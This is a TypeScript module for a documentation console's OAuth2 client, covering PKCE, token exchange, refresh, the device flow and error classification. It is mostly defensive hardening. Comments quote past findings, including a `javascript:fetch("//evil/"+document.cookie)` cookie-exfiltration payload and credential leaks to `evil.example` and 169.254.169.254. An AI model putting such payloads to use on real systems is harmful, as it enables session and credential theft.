/**
 * OAuth2 as requests and answers, with no state and no storage.
 *
 * Every function here turns a flow plus what the reader supplied into a {@link RequestPlan}, or
 * turns a response into one of three outcomes. The session that holds tokens and decides when to
 * refresh is `token-session.service.ts`; keeping the two apart is what lets the crafted response
 * cases be tested without a transport and the lifecycle cases without a server.
 *
 * THE THREE OUTCOMES ARE THE POINT OF `parseTokenResponse`, per SPEC 14.4.1. A refresh that fails
 * ends the session only when the token endpoint said the grant is dead, which RFC 6749 §5.2 spells
 * `invalid_grant`. A network failure, a 5xx, a timeout and an unparseable answer are the same
 * event as far as the session is concerned: nothing is known, try again. The opposite behaviour
 * makes a dropped packet cost the reader a sign in, which is worst on exactly the networks where
 * this tool is most useful.
 */

import { AuthError, ErrorCode } from '@openref/core';
import { isHttpUrl, isSecureCredentialUrl } from '@openref/core/security';
import { formEncode } from '../../request/domain/body';
import type {
  OAuthFlowKind,
  RequestPlan,
  RunnableOAuthFlow,
} from '../../request/domain/request-plan';
import { base64Text } from './base64';
import { PKCE_METHOD } from './pkce';

/** Flows that send the reader to an authorization server and come back through a redirect. */
export const REDIRECT_FLOWS: readonly OAuthFlowKind[] = ['authorizationCode', 'implicit'];

/** What the reader supplied about a client, held for as long as the session is. */
export interface OAuthClient {
  readonly clientId: string;
  /**
   * The client secret, when the deployment has one.
   *
   * A PUBLIC CLIENT IS THE NORMAL CASE HERE AND HAS NONE. A secret typed into a page is a secret
   * the page holds, which is why the storage policy of SPEC 14.4 covers it and why it never
   * reaches a rendered document. It exists because `clientCredentials` cannot be run without one
   * and a reader testing an internal API is entitled to run it.
   */
  readonly clientSecret?: string;
  readonly scopes?: readonly string[];
  /** For `password`, the resource owner's own credentials, held in memory for the retry rule. */
  readonly username?: string;
  readonly password?: string;
}

/** A token as the token endpoint described it. */
export interface OAuthToken {
  readonly accessToken: string;
  readonly tokenType: string;
  readonly refreshToken?: string;
  /**
   * Lifetime the token endpoint reported, in seconds.
   *
   * AN ESTIMATE AND NEVER A GATE, per SPEC 14.4.1. It is measured from the moment the answer
   * arrived, and the reader's clock, a sleeping machine and the flight time all move it. It is
   * shown as an approaching expiry and is never a reason to refuse to send: the authority on
   * whether a token is alive is the API's 401.
   */
  readonly expiresInSeconds?: number;
  readonly scope?: string;
}

/** What a token endpoint answered, classified before anything acts on it. */
export type TokenOutcome =
  | { readonly kind: 'token'; readonly token: OAuthToken }
  /** The grant is dead and the session is over: `invalid_grant`, and nothing else. */
  | { readonly kind: 'grant-dead'; readonly message: string; readonly error: string }
  /** Nothing is known about the grant. The session survives and the reader may try again. */
  | { readonly kind: 'unknown'; readonly message: string; readonly reason: TokenFailureReason }
  /** The device flow's two waiting answers, which are neither a failure nor a token. */
  | { readonly kind: 'pending'; readonly slowDown: boolean };

/** Why a token endpoint answered nothing usable. */
export type TokenFailureReason = 'server' | 'malformed' | 'refused';

/** What a device authorization endpoint answered. */
export interface DeviceAuthorization {
  readonly deviceCode: string;
  readonly userCode: string;
  readonly verificationUri: string;
  readonly verificationUriComplete?: string;
  readonly expiresInSeconds: number;
  readonly intervalSeconds: number;
}

function pairs(fields: readonly (readonly [string, string | undefined])[]): string {
  return fields
    .filter((field): field is readonly [string, string] => field[1] !== undefined)
    .map(([name, value]) => `${formEncode(name)}=${formEncode(value)}`)
    .join('&');
}

/**
 * Builds the request to a token endpoint, with the client authenticated the way RFC 6749 prefers.
 *
 * A CONFIDENTIAL CLIENT AUTHENTICATES IN THE HEADER AND A PUBLIC ONE NAMES ITSELF IN THE BODY.
 * RFC 6749 §2.3.1 says a server must support the header form and may support the body form, so
 * the header is what a secret goes in. `client_id` is in the body regardless, because RFC 7636
 * §4.3 requires it for a public client's code exchange and no server minds seeing it twice.
 */
function tokenPlan(
  url: string,
  client: OAuthClient,
  fields: readonly (readonly [string, string | undefined])[],
): RequestPlan {
  const headers: Record<string, string> = {
    'Content-Type': 'application/x-www-form-urlencoded',
    Accept: 'application/json',
  };

  if (client.clientSecret !== undefined && client.clientSecret !== '') {
    headers.Authorization = `Basic ${base64Text(`${client.clientId}:${client.clientSecret}`)}`;
  }

  return {
    method: 'POST',
    url,
    headers,
    body: pairs([['client_id', client.clientId], ...fields]),
    // A TOKEN ENDPOINT THAT REDIRECTS IS NOT FOLLOWED. A redirect on a request carrying a client
    // secret and a code verifier moves both to whatever the answer names, which is the shape of
    // a credential leak rather than of a moved endpoint.
    redirect: 'manual',
  };
}

function scopeOf(flow: RunnableOAuthFlow, client: OAuthClient): string | undefined {
  const requested = client.scopes ?? flow.scopes;

  return requested.length === 0 ? undefined : requested.join(' ');
}

/**
 * The url the reader is sent to, for the two flows that redirect.
 *
 * `code_challenge_method` IS WRITTEN AS A CONSTANT. It is not read from the flow, not read from a
 * document and not read back from any response, which is what SPEC 14.4 means by mandatory.
 *
 * @param flow - The flow, which must carry an authorization url
 * @param client - Client id and the scopes to ask for
 * @param request - Redirect uri, state, and the challenge for the code flow
 * @returns The absolute url to send the reader to
 * @throws {AuthError} When the flow declares no authorization url, or the code flow was handed
 *         no challenge
 *
 * @example
 * const url = authorizationUrl(flow, client, { redirectUri, state, challenge });
 */
export function authorizationUrl(
  flow: RunnableOAuthFlow,
  client: OAuthClient,
  request: { readonly redirectUri: string; readonly state: string; readonly challenge?: string },
): string {
  const base = flow.authorizationUrl ?? '';
  if (base === '') {
    throw new AuthError(
      `the ${flow.kind} flow declares no authorization url, so there is nowhere to send the reader`,
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow: flow.kind },
    );
  }

  // THE ONE ADDRESS A READER IS NAVIGATED TO RATHER THAN FETCHED FROM, which is why the refusal
  // matters more here than on the four beside it: a `fetch` to a strange scheme fails, and a
  // navigation to one hands the reader's browser whatever the document wrote. Measured before this
  // call existed, `javascript:` and `data:` were both built without a word.
  secureFlowUrl(base, 'authorization url', flow.kind);

  const implicit = flow.kind === 'implicit';

  if (!implicit && (request.challenge === undefined || request.challenge === '')) {
    throw new AuthError(
      'the authorization code flow was started without a PKCE challenge, which SPEC 14.4 makes ' +
        'mandatory; this is a defect in the caller rather than something to retry',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow: flow.kind },
    );
  }

  const query = pairs([
    ['response_type', implicit ? 'token' : 'code'],
    ['client_id', client.clientId],
    ['redirect_uri', request.redirectUri],
    ['scope', scopeOf(flow, client)],
    ['state', request.state],
    ...(implicit
      ? []
      : ([
          ['code_challenge', request.challenge],
          ['code_challenge_method', PKCE_METHOD],
        ] as const)),
  ]);

  return `${base}${base.includes('?') ? '&' : '?'}${query}`;
}

/**
 * What the runner remembered when it sent the reader to an authorization server.
 *
 * IT HAS TO CARRY EVERYTHING THE EXCHANGE NEEDS, because between writing it and reading it the
 * page is gone. T035 proved this in a browser: the flow and the client used to live in a field of
 * the session service, the redirect destroys the JavaScript context that field is in, and every
 * return landed on `this page has no record of the flow that answer belongs to`. Under jsdom and
 * Node one service instance spans the whole flow, so nothing red was ever produced by the defect
 * that made the gesture impossible.
 *
 * AND IT MUST NOT CARRY THE CLIENT SECRET. This record is plain JSON in `sessionStorage`, readable
 * by any script on the origin, and SPEC 14.4's storage policy is about exactly that difference: a
 * flow's urls and a client id are public facts of the document, a secret is a credential. A
 * confidential client in a redirect flow is therefore refused by name rather than half completed.
 */
export interface PendingAuthorization {
  readonly schemeId: string;
  readonly flow: OAuthFlowKind;
  readonly state: string;
  /** Absent for `implicit`, which has no exchange, and required for everything else. */
  readonly verifier?: string;
  readonly redirectUri: string;
  /** Where the reader was, so they land back on it. */
  readonly returnPath: string;
  /** The flow itself, so the exchange can be built on a page that never ran `signIn`. */
  readonly runnableFlow?: RunnableOAuthFlow;
  /** The client as the reader supplied it, with the secret removed. */
  readonly client?: OAuthClient;
  /** Whether a secret was supplied, so the return can say why it refuses instead of guessing. */
  readonly secretSupplied?: boolean;
}

/** A callback's parameters, as they arrived in the query string or the fragment. */
export type CallbackParams = Readonly<Record<string, string>>;

/**
 * Reads an authorization server's answer, and refuses everything about it that is not the answer.
 *
 * THIS IS WHERE A CRAFTED RESPONSE IS STOPPED, AND IT IS STOPPED BY WHAT IS NOT HERE. The
 * response's own parameters are read for exactly three things: an error, the state and the code.
 * Nothing selects a challenge method, nothing supplies a verifier, nothing names a token endpoint
 * and nothing changes the redirect uri. A server that answers with `code_challenge_method=plain`,
 * with a `code_verifier` of its own, or with a second `state` it prefers is answering into a
 * function that does not read those, and the exchange that follows sends the verifier this runner
 * generated because that is the only verifier that exists.
 *
 * @param params - The callback parameters
 * @param pending - What was remembered when the reader was sent away
 * @returns The authorization code
 * @throws {AuthError} When the server reported an error, when `state` does not match, when there
 *         is no code, or when the pending record carries no verifier to exchange with
 *
 * @example
 * const code = readAuthorizationCode({ code: 'abc', state }, pending);
 */
export function readAuthorizationCode(
  params: CallbackParams,
  pending: PendingAuthorization,
): string {
  assertNoError(params, pending);
  assertState(params, pending);

  const code = params.code ?? '';
  if (code === '') {
    throw new AuthError(
      'the authorization server came back without a code, so there is nothing to exchange',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { schemeId: pending.schemeId },
    );
  }

  // THE VERIFIER IS CHECKED HERE AND NOT AT THE EXCHANGE, so that a pending record without one is
  // refused before a request carrying a code and no proof of possession can be built at all.
  if ((pending.verifier ?? '') === '') {
    throw new AuthError(
      'this authorization has no PKCE verifier, so the code cannot be exchanged; PKCE S256 is ' +
        'mandatory on the authorization code flow and an exchange without it is not attempted',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { schemeId: pending.schemeId },
    );
  }

  return code;
}

/**
 * Reads an implicit flow's answer, which carries the token itself rather than a code.
 *
 * @param params - The fragment parameters
 * @param pending - What was remembered when the reader was sent away
 * @returns The token
 * @throws {AuthError} When the server reported an error, when `state` does not match, or when
 *         there is no access token
 *
 * @example
 * const token = readImplicitToken(fragmentParams, pending);
 */
export function readImplicitToken(
  params: CallbackParams,
  pending: PendingAuthorization,
): OAuthToken {
  assertNoError(params, pending);
  assertState(params, pending);

  const accessToken = params.access_token ?? '';
  if (accessToken === '') {
    throw new AuthError(
      'the authorization server came back without an access token',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { schemeId: pending.schemeId },
    );
  }

  // THE IMPLICIT FLOW'S TOKEN COMES OUT OF A URL FRAGMENT AND NOT OUT OF A JSON BODY, so it does
  // not pass through `parseTokenResponse` and needs the same refusal of its own.
  const unsendable = unsendableTokenReason(accessToken);
  if (unsendable !== undefined) {
    throw new AuthError(unsendable, ErrorCode.RUN_AUTH_FAILED, undefined, {
      schemeId: pending.schemeId,
    });
  }

  const expires = Number(params.expires_in ?? '');

  return {
    accessToken,
    tokenType: params.token_type ?? 'Bearer',
    ...(Number.isFinite(expires) && expires > 0 ? { expiresInSeconds: expires } : {}),
    ...(params.scope === undefined ? {} : { scope: params.scope }),
    // AN IMPLICIT FLOW HANDS BACK NO REFRESH TOKEN AND THIS DOES NOT INVENT ONE. RFC 6749 §4.2.2
    // forbids issuing one there, so a server that sends one is answering outside the flow and the
    // silent renewal of SPEC 14.4.1 does not apply to it.
  };
}

function assertNoError(params: CallbackParams, pending: PendingAuthorization): void {
  const error = params.error ?? '';
  if (error === '') return;

  const description = params.error_description ?? '';

  throw new AuthError(
    `the authorization server refused the request with '${error}'` +
      (description === '' ? '' : `: ${description}`),
    ErrorCode.RUN_AUTH_FAILED,
    undefined,
    { schemeId: pending.schemeId, error },
  );
}

function assertState(params: CallbackParams, pending: PendingAuthorization): void {
  if ((params.state ?? '') === pending.state) return;

  throw new AuthError(
    'this authorization answer carries a state this page did not send, so it belongs to another ' +
      'request and is refused',
    ErrorCode.RUN_AUTH_FAILED,
    undefined,
    { schemeId: pending.schemeId },
  );
}

/**
 * The exchange of an authorization code for a token.
 *
 * @param flow - The flow, which must carry a token url
 * @param client - Client id and secret
 * @param exchange - The code, the verifier and the redirect uri the code was issued for
 * @returns The request to send
 * @throws {AuthError} When the flow declares no token url
 *
 * @example
 * const plan = codeExchangePlan(flow, client, { code, verifier, redirectUri });
 */
export function codeExchangePlan(
  flow: RunnableOAuthFlow,
  client: OAuthClient,
  exchange: { readonly code: string; readonly verifier: string; readonly redirectUri: string },
): RequestPlan {
  return tokenPlan(tokenUrlOf(flow), client, [
    ['grant_type', 'authorization_code'],
    ['code', exchange.code],
    ['redirect_uri', exchange.redirectUri],
    ['code_verifier', exchange.verifier],
  ]);
}

/**
 * The `client_credentials` grant.
 *
 * @param flow - The flow, which must carry a token url
 * @param client - Client id and secret
 * @returns The request to send
 * @throws {AuthError} When the flow declares no token url
 *
 * @example
 * const plan = clientCredentialsPlan(flow, client);
 */
export function clientCredentialsPlan(flow: RunnableOAuthFlow, client: OAuthClient): RequestPlan {
  return tokenPlan(tokenUrlOf(flow), client, [
    ['grant_type', 'client_credentials'],
    ['scope', scopeOf(flow, client)],
  ]);
}

/**
 * The `password` grant, with the resource owner's own credentials.
 *
 * @param flow - The flow, which must carry a token url
 * @param client - Client id, secret, username and password
 * @returns The request to send
 * @throws {AuthError} When the flow declares no token url, or no username was supplied
 *
 * @example
 * const plan = passwordPlan(flow, client);
 */
export function passwordPlan(flow: RunnableOAuthFlow, client: OAuthClient): RequestPlan {
  if ((client.username ?? '') === '') {
    throw new AuthError(
      'the password grant needs the resource owner username and password, and none was supplied',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow: flow.kind },
    );
  }

  return tokenPlan(tokenUrlOf(flow), client, [
    ['grant_type', 'password'],
    ['username', client.username],
    ['password', client.password ?? ''],
    ['scope', scopeOf(flow, client)],
  ]);
}

/**
 * The refresh, which is the one request SPEC 14.4.1 allows a 401 to trigger.
 *
 * @param flow - The flow, whose `refreshUrl` is preferred over its token url when it declares one
 * @param client - Client id and secret
 * @param refreshToken - The refresh token, which lives in memory only
 * @returns The request to send
 * @throws {AuthError} When the flow declares neither a refresh url nor a token url
 *
 * @example
 * const plan = refreshPlan(flow, client, refreshToken);
 */
export function refreshPlan(
  flow: RunnableOAuthFlow,
  client: OAuthClient,
  refreshToken: string,
): RequestPlan {
  const url = flow.refreshUrl ?? flow.tokenUrl ?? '';
  if (url === '') {
    throw new AuthError(
      `the ${flow.kind} flow declares no token url, so a session cannot be renewed`,
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow: flow.kind },
    );
  }

  return tokenPlan(secureFlowUrl(url, 'token url', flow.kind), client, [
    ['grant_type', 'refresh_token'],
    ['refresh_token', refreshToken],
    ['scope', scopeOf(flow, client)],
  ]);
}

/**
 * The request that starts the device flow of RFC 8628.
 *
 * @param flow - The flow, which must carry a device authorization url
 * @param client - Client id and the scopes to ask for
 * @returns The request to send
 * @throws {AuthError} When the flow declares no device authorization url
 *
 * @example
 * const plan = deviceAuthorizationPlan(flow, client);
 */
export function deviceAuthorizationPlan(flow: RunnableOAuthFlow, client: OAuthClient): RequestPlan {
  const url = flow.deviceAuthorizationUrl ?? '';
  if (url === '') {
    throw new AuthError(
      'the device flow declares no device authorization url, so it cannot be started',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow: flow.kind },
    );
  }

  const deviceUrl = secureFlowUrl(url, 'device authorization url', flow.kind);

  return tokenPlan(deviceUrl, client, [['scope', scopeOf(flow, client)]]);
}

/**
 * The poll that turns a device code into a token.
 *
 * @param flow - The flow, which must carry a token url
 * @param client - Client id and secret
 * @param deviceCode - The device code the authorization endpoint issued
 * @returns The request to send
 * @throws {AuthError} When the flow declares no token url
 *
 * @example
 * const plan = devicePollPlan(flow, client, deviceCode);
 */
export function devicePollPlan(
  flow: RunnableOAuthFlow,
  client: OAuthClient,
  deviceCode: string,
): RequestPlan {
  return tokenPlan(tokenUrlOf(flow), client, [
    ['grant_type', 'urn:ietf:params:oauth:grant-type:device_code'],
    ['device_code', deviceCode],
  ]);
}

/**
 * Refuses an address a flow would send a credential to, or navigate a reader to.
 *
 * PER SPEC 14.4, AND IT ASKS THE QUESTION OF EVERY ADDRESS RATHER THAN OF THE DISCOVERED ONES.
 * `discovery.ts` has always refused an endpoint that is not https or loopback, and a flow the
 * OpenAPI document declared went straight past it: measured before this existed, a
 * `clientCredentials` request to `http://evil.example/token` was built carrying the client secret
 * in a `Basic` header, and a code exchange to `http://169.254.169.254/token` carrying the PKCE
 * verifier. The predicate is `core`'s, so the two paths cannot come to disagree about what secure
 * means.
 *
 * @param url - The address as the document or the server wrote it
 * @param what - Which address it is, for the refusal
 * @param flow - The flow it belongs to, for the refusal
 * @returns The url, unchanged, when it may be used
 *
 * @throws {AuthError} When it is not an absolute https url, loopback http aside
 */
/**
 * Refuses a verification address the reader could not safely be sent to.
 *
 * `http` and `https` and nothing else. This value is not a credential path, so it does not take
 * the https rule the flow's own addresses take: a device verification page on a plain http host is
 * a real arrangement. What it may not be is a scheme that hands the reader's operating system
 * something, which is what an unfiltered value in an `href` does.
 *
 * @param value - The address the authorization server returned
 * @param field - Which field it came from, for the refusal
 * @param status - Response status, for the refusal context
 *
 * @throws {AuthError} When the address names a scheme a reader must not be handed
 */
function assertVerificationUri(value: string, field: string, status: number): void {
  let parsed: URL;
  try {
    parsed = new URL(value);
  } catch {
    throw new AuthError(
      `the device authorization endpoint's ${field} is not an absolute url`,
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { status, field, value },
    );
  }

  if (!isHttpUrl(parsed)) {
    throw new AuthError(
      `the device authorization endpoint's ${field} names the scheme ` +
        `${parsed.protocol.replace(':', '')}, and the reader is only ever sent to http or https`,
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { status, field, value },
    );
  }
}

function secureFlowUrl(url: string, what: string, flow: string): string {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    throw new AuthError(
      `the ${flow} flow's ${what} is not an absolute url, so there is nowhere to send anything`,
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow, what, url },
    );
  }

  if (!isSecureCredentialUrl(parsed)) {
    throw new AuthError(
      `the ${flow} flow's ${what} is ${parsed.protocol.replace(':', '')} rather than https, and a ` +
        'credential is not sent over it. Only a loopback host is admitted without https',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow, what, url },
    );
  }

  return url;
}

function tokenUrlOf(flow: RunnableOAuthFlow): string {
  const url = flow.tokenUrl ?? '';
  if (url === '') {
    throw new AuthError(
      `the ${flow.kind} flow declares no token url, so there is nowhere to ask for a token`,
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { flow: flow.kind },
    );
  }

  return secureFlowUrl(url, 'token url', flow.kind);
}

function asRecord(body: string): Record<string, unknown> | null {
  try {
    const parsed: unknown = JSON.parse(body);

    return typeof parsed === 'object' && parsed !== null && !Array.isArray(parsed)
      ? (parsed as Record<string, unknown>)
      : null;
  } catch {
    return null;
  }
}

function stringField(record: Record<string, unknown>, name: string): string | undefined {
  const value = record[name];

  return typeof value === 'string' && value !== '' ? value : undefined;
}

function numberField(record: Record<string, unknown>, name: string): number | undefined {
  const value = record[name];
  const parsed = typeof value === 'number' ? value : Number(typeof value === 'string' ? value : '');

  return Number.isFinite(parsed) && parsed > 0 ? parsed : undefined;
}

/**
 * The largest access token this console will hold.
 *
 * 32 KB, which is above every real bearer token including the large signed ones, and below the
 * point where holding it does damage. A token becomes an `Authorization` header on the next Send:
 * the common server limit for one header is 8 KB and for the whole block 16 KB, so anything near
 * this is already unsendable, and something has gone wrong at the authorization server rather than
 * a very large credential having been issued on purpose.
 */
export const MAX_ACCESS_TOKEN_CHARS = 32 * 1024;

/**
 * Whether an access token can become a header at all, and what is wrong when it cannot.
 *
 * IT IS CHECKED WHERE THE TOKEN ARRIVES AND NOT WHERE IT IS SENT, per T035. A token carrying CR or
 * LF was accepted, written to storage and reported as a successful sign in; the failure arrived
 * later, when `applyCredentials` built `Authorization: Bearer <value>` and `fetch` refused the
 * header, and the reader was told the request did not reach a server. That sentence is about a
 * network, and the fault was in the answer the authorization server gave minutes earlier.
 *
 * @param token - The access token as the endpoint sent it
 * @returns The reason it cannot be held, or undefined when it can
 */
export function unsendableTokenReason(token: string): string | undefined {
  if (token.length > MAX_ACCESS_TOKEN_CHARS) {
    return (
      `the authorization server answered with an access token of ${String(token.length)} ` +
      `characters, and this console holds at most ${String(MAX_ACCESS_TOKEN_CHARS)}; a token ` +
      'that size cannot be sent as a header by any server this console can reach'
    );
  }

  if (/[\u0000-\u001f\u007f]/u.test(token)) {
    return (
      'the authorization server answered with an access token carrying control characters, ' +
      'which cannot go into an Authorization header; it is refused here rather than at the ' +
      'moment you press Send, where it would read as a network failure'
    );
  }

  return undefined;
}

/**
 * Classifies what a token endpoint answered, before anything acts on it.
 *
 * @param status - HTTP status of the answer
 * @param body - The answer's body, as text
 * @returns One of the four outcomes
 *
 * @example
 * const outcome = parseTokenResponse(400, '{"error":"invalid_grant"}');
 */
export function parseTokenResponse(status: number, body: string): TokenOutcome {
  // A REDIRECT IS THE ONE ANSWER THAT HAS ITS OWN SENTENCE, because the plan asked for `manual`
  // and this is what that looks like coming back: status 0 for the opaque response a browser
  // gives, the 3xx itself under Node. Without this the refusal is real and the reason printed is
  // `not a JSON object`, which sends a reader to look at a body that was never delivered. The
  // discovery reader has had the right sentence for this since T028; T035 found the token side
  // never got one, because only a browser produces the input.
  if (status === 0 || (status >= 300 && status < 400)) {
    return {
      kind: 'unknown',
      reason: 'refused',
      message:
        'the token endpoint answered with a redirect, which is not followed: a request carrying ' +
        'a client secret and a code verifier is not moved to whatever host the answer names',
    };
  }

  const record = asRecord(body);

  if (record === null) {
    return {
      kind: 'unknown',
      reason: 'malformed',
      message:
        'the token endpoint answered with something that is not a JSON object, so nothing is ' +
        'known about the session; try again',
    };
  }

  const error = stringField(record, 'error');

  if (error !== undefined) {
    if (error === 'authorization_pending' || error === 'slow_down') {
      return { kind: 'pending', slowDown: error === 'slow_down' };
    }

    // `invalid_grant` AND NOTHING ELSE ENDS THE SESSION, per RFC 6749 §5.2 and SPEC 14.4.1. Every
    // other error, including `invalid_client` and `invalid_request`, says something is wrong with
    // the request or the client rather than that the grant is spent, and a reader whose network
    // hiccuped is not asked to sign in again.
    if (error === 'invalid_grant') {
      return {
        kind: 'grant-dead',
        error,
        message: stringField(record, 'error_description') ?? 'the grant is no longer valid',
      };
    }

    return {
      kind: 'unknown',
      reason: 'refused',
      message: `the token endpoint refused the request with '${error}'`,
    };
  }

  if (status >= 500) {
    return {
      kind: 'unknown',
      reason: 'server',
      message: `the token endpoint answered ${String(status)}, which says nothing about the session`,
    };
  }

  const accessToken = stringField(record, 'access_token');
  if (accessToken === undefined) {
    return {
      kind: 'unknown',
      reason: 'malformed',
      message: 'the token endpoint answered without an access token, so nothing is known yet',
    };
  }

  // REFUSED WHERE IT ARRIVES, per T035. Every flow's token comes through here, so one check covers
  // the exchange, the refresh, the password and client credentials grants and the device poll.
  const unsendable = unsendableTokenReason(accessToken);
  if (unsendable !== undefined) {
    return { kind: 'unknown', reason: 'malformed', message: unsendable };
  }

  const refreshToken = stringField(record, 'refresh_token');
  const expires = numberField(record, 'expires_in');
  const scope = stringField(record, 'scope');

  return {
    kind: 'token',
    token: {
      accessToken,
      tokenType: stringField(record, 'token_type') ?? 'Bearer',
      ...(refreshToken === undefined ? {} : { refreshToken }),
      ...(expires === undefined ? {} : { expiresInSeconds: expires }),
      ...(scope === undefined ? {} : { scope }),
    },
  };
}

/**
 * Reads a device authorization answer.
 *
 * @param status - HTTP status of the answer
 * @param body - The answer's body, as text
 * @returns What the reader is shown and what the poll uses
 * @throws {AuthError} When the answer is not a device authorization
 *
 * @example
 * const device = parseDeviceAuthorization(200, body);
 */
export function parseDeviceAuthorization(status: number, body: string): DeviceAuthorization {
  const record = asRecord(body);
  const deviceCode = record === null ? undefined : stringField(record, 'device_code');
  const userCode = record === null ? undefined : stringField(record, 'user_code');
  const verificationUri =
    record === null
      ? undefined
      : (stringField(record, 'verification_uri') ?? stringField(record, 'verification_url'));

  if (record === null || deviceCode === undefined || userCode === undefined) {
    const refused = record === null ? undefined : stringField(record, 'error');

    throw new AuthError(
      refused === undefined
        ? `the device authorization endpoint answered ${String(status)} with no device code`
        : `the device authorization endpoint refused the request with '${refused}'`,
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { status },
    );
  }

  if (verificationUri === undefined) {
    throw new AuthError(
      'the device authorization endpoint named no verification url, so the reader has nowhere ' +
        'to enter the code',
      ErrorCode.RUN_AUTH_FAILED,
      undefined,
      { status },
    );
  }

  const complete = stringField(record, 'verification_uri_complete');

  // THE ONE VALUE HERE THAT BECOMES AN href, SO IT IS FILTERED WHERE IT IS PARSED RATHER THAN
  // WHERE IT IS DRAWN. Found by the pre-M4 review: the second reference theme bound
  // `verification_uri_complete` straight into an anchor while the default theme printed it as
  // text, which is the shape of two surfaces answering a question nobody asked. Measured through
  // this parser, `javascript:fetch("//evil/"+document.cookie)` reached that href with the anchor
  // text showing a plausible `https` address beside it, so the link was spoofed as well as
  // unfiltered. Refused here, once, so no theme has to remember: a device flow whose verification
  // address a reader cannot open is a flow that cannot be completed, and saying so is the answer.
  assertVerificationUri(verificationUri, 'verification_uri', status);
  if (complete !== undefined) {
    assertVerificationUri(complete, 'verification_uri_complete', status);
  }

  return {
    deviceCode,
    userCode,
    verificationUri,
    ...(complete === undefined ? {} : { verificationUriComplete: complete }),
    expiresInSeconds: numberField(record, 'expires_in') ?? 600,
    // FIVE SECONDS IS RFC 8628's OWN DEFAULT, and it is a floor rather than a suggestion: a
    // server that answers `slow_down` is telling the client it polled too fast.
    intervalSeconds: numberField(record, 'interval') ?? 5,
  };
}
